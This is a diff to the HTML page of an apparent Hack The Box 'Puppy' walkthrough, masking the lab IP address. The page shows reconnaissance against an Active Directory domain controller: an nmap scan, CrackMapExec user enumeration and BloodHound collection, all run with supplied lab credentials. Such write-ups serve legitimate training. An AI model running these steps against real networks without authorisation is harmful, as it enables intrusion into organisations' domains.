@@ -125,7 +125,7 @@
                   <thead>
                     <tr class="bg-gray-800">
                       <th class="border border-gray-700 p-2 text-left"><strong class="text-gray-400">General Information</strong></th>
-                      <th class="border border-gray-700 p-2 text-left"><strong class="text-gray-400">IP Address: 10.10.11.xx</strong></th>
+                      <th class="border border-gray-700 p-2 text-left"><strong class="text-gray-400">IP Address: xx.xx.xx.xx</strong></th>
                     </tr>
                   </thead>
                   <tbody>
@@ -163,9 +163,9 @@ want to ask something, <strong class="text-green-400"><a href="/pages/contact.ht
                 <li><strong>user:</strong> <strong class="text-green-400">levi.james</strong></li>
                 <li><strong>password:</strong> <strong class="text-green-400">KingofAkron2025!</strong></li>
                 <pre class="bg-gray-800 p-4 rounded-lg overflow-x-auto"><code class="text-gray-400">┌──(meow㉿uziii2208)-[~]
-└─$ nmap -A 10.10.11.xx --min-rate 10000
+└─$ nmap -A xx.xx.xx.xx --min-rate 10000
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 15:00 EDT
-Nmap scan report for 10.10.11.xx
+Nmap scan report for xx.xx.xx.xx
 Host is up (0.097s latency).
 Not shown: 985 filtered tcp ports (no-response)
 Bug in iscsi-info: no string output.
@@ -225,33 +225,33 @@ Host script results:
 
 TRACEROUTE (using port 445/tcp)
 HOP RTT ADDRESS
-1 96.82 ms 10.10.11.xx
-2 96.78 ms 10.10.11.xx
+1 96.82 ms xx.xx.xx.xx
+2 96.78 ms xx.xx.xx.xx
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 176.71 seconds</code></pre>
 
                 <li>Use <strong class="text-green-400">CrackMapExec</strong> to scan users, taking advantage of existing account and password information.</li>
                 <pre class="bg-gray-800 p-4 rounded-lg overflow-x-auto"><code class="text-gray-400">┌──(meow㉿uziii2208)-[~]
-└─$ sudo crackmapexec smb 10.10.11.xx -u levi.james -p 'KingofAkron2025!' --users
-SMB 10.10.11.xx 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.H
+└─$ sudo crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --users
+SMB xx.xx.xx.xx 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.H
 TB) (signing:True) (SMBv1:False)
-SMB 10.10.11.xx 445 DC [+] PUPPY.HTB\levi.james:KingofAkron2025!
-SMB 10.10.11.xx 445 DC [+] Enumerated domain user(s)
-SMB 10.10.11.xx 445 DC PUPPY.HTB\************_adm badpwdcount: 5 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\************ badpwdcount: 5 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\************** badpwdcount: 5 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\*********** badpwdcount: 0 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\********** badpwdcount: 0 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\********** badpwdcount: 0 desc:
-SMB 10.10.11.xx 445 DC PUPPY.HTB\****** badpwdcount: 0 desc: Key Distribution Center Service Account
-SMB 10.10.11.xx 445 DC PUPPY.HTB\Guest badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
-SMB 10.10.11.xx 445 DC PUPPY.HTB\Administrator badpwdcount: 0 desc: Built-in account for administering the computer/domain</code></pre>
+SMB xx.xx.xx.xx 445 DC [+] PUPPY.HTB\levi.james:KingofAkron2025!
+SMB xx.xx.xx.xx 445 DC [+] Enumerated domain user(s)
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\************_adm badpwdcount: 5 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\************ badpwdcount: 5 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\************** badpwdcount: 5 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\*********** badpwdcount: 0 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\********** badpwdcount: 0 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\********** badpwdcount: 0 desc:
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\****** badpwdcount: 0 desc: Key Distribution Center Service Account
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\Guest badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
+SMB xx.xx.xx.xx 445 DC PUPPY.HTB\Administrator badpwdcount: 0 desc: Built-in account for administering the computer/domain</code></pre>
 
                 <li>Add <strong class="text-green-400">DC.PUPPY.HTB</strong> and <strong class="text-green-400">PUPPY.HTB</strong> (domain name and domain controller) to the <strong class="text-green-400">/etc/hosts</strong> file.</li>
                 <pre class="bg-gray-800 p-4 rounded-lg overflow-x-auto"><code class="text-gray-400">┌──(meow㉿uziii2208)-[~]
-└─$ echo "10.10.11.xx DC.PUPPY.HTB PUPPY.HTB" | sudo tee -a /etc/hosts
-10.10.11.xx DC.PUPPY.HTB PUPPY.HTB</code></pre>
+└─$ echo "xx.xx.xx.xx DC.PUPPY.HTB PUPPY.HTB" | sudo tee -a /etc/hosts
+xx.xx.xx.xx DC.PUPPY.HTB PUPPY.HTB</code></pre>
 
                 <li>Split the list of users and write it to a file <strong class="text-green-400">users.txt</strong>.</li>
                 <pre class="bg-gray-800 p-4 rounded-lg overflow-x-auto"><code class="text-gray-400">┌──(meow㉿uziii2208)-[~/Desktop/HTB/Puppy]
@@ -275,13 +275,13 @@ Guest
 
 ┌──(meow㉿uziii2208)-[~/Desktop/HTB/Puppy]
 └─$ cat /etc/resolv.conf
-nameserver 10.10.11.xx
+nameserver xx.xx.xx.xx
 nameserver 8.8.8.8
 nameserver 1.1.1.1
 nameserver 192.168.0.1
 
 ┌──(meow㉿uziii2208)-[~/Desktop/HTB/Puppy]
-└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloound_results.json -ns 10.10.11.xx
+└─$ bloodhound-python -dc DC.PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' -d PUPPY.HTB -c All -o bloound_results.json -ns xx.xx.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: puppy.htb
 INFO: Getting TGT for user
